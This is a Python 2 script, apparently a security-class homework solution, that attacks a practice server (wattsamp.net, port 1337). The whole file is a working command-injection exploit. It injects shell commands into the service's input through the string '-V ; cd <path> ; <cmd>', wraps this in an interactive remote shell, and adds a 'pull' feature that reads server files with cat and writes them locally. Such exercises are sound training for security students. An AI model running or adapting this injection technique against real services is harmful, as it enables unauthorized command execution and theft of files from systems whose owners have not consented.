"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here
helpstring = """Commands:
shell: Access wattsamp's servers through an interactive shell, use 'exit' to exit this mode
pull <remote-path> <local-path>: Download files from the server
help: Show this help menu
quit: Quit the shell"""

def execute_cmd(cmd, paths):
    """
        Sockets: https://docs.python.org/3/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(0.7)
    s.recv(1024)
    to_send = "-V ; cd " + paths + " ; " + cmd + "\n"
    s.send(to_send)
    res = s.recv(1024)
    i = res.index("\n")
    return res[i+1:]

def run_shell ():
    paths = "/"
    cmd = ""
    while cmd != "exit":
        cmd = raw_input(paths + "> ")
        if cmd != "exit":
            if cmd.split(" ")[0] == "cd":
                newpath = cmd.split(" ")[1]
                if newpath == "../":
                    splitpath = paths.split("/")
                    paths = "/".join(splitpath[:len(splitpath)-2]) + "/"
                else:
                    paths = paths + cmd.split(" ")[1] + "/"
            else:
                print execute_cmd(cmd, paths)


if __name__ == '__main__':
    cmd = ""
    while cmd != "quit":
        cmd = raw_input("> ")
        if cmd != "quit":
            args = cmd.split(" ")
            if args[0] == "shell" and len(args) == 1:
                run_shell()
            elif args[0] == "pull" and len(args) == 3:
                data = execute_cmd("cat " + args[1], "/")
                f = open(args[2], "w+")
                f.write(data)
                f.close()
            #else if args[0] == "help" && len(args) == 1:
                # display help option
            else:
                print helpstring
